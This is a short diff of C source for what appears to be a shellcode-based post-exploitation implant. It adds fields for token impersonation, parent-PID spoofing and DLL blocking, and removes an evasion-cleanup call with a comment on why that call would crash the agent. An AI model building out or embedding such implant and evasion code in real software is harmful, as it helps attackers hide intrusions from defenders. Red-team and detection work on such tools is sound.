@@ -727,6 +727,11 @@ VOID agent_init(PINSTANCE inst, HINSTANCE hDll) {
     inst->ClrPipeWrite       = NULL;
     inst->ClrStdoutRedirected = FALSE;
 
+    // Token / spawn-modification state
+    inst->ImpersonationToken = NULL;
+    inst->SpoofPPID          = 0;
+    inst->BlockDlls          = FALSE;
+
     // Cleanup state
     inst->pOriginalAlloc  = NULL;
     inst->szOriginalAlloc = 0;
@@ -1266,10 +1271,12 @@ EXTERN_C VOID main_entry(PVOID base_addr) {
 
     agent_init(inst, (HINSTANCE)base_addr);
 
-#ifdef INCLUDE_EVASION_CLEANUP
-    discover_shellcode_alloc(inst, base_addr);
-    cleanup_shellcode(inst);
-#endif
+    /* NOTE: INCLUDE_EVASION_CLEANUP does not apply here. In standalone PIC mode
+       base_addr is the allocation holding this agent's own .text and instance
+       storage (the linker script merges everything into one .text that the
+       builder dumps as shellcode). discover_shellcode_alloc/cleanup_shellcode
+       would VirtualProtect it PAGE_READWRITE, zero and free it while we are
+       still executing inside it - instant AV on the next instruction fetch. */
 
     agent_main(inst);
 }
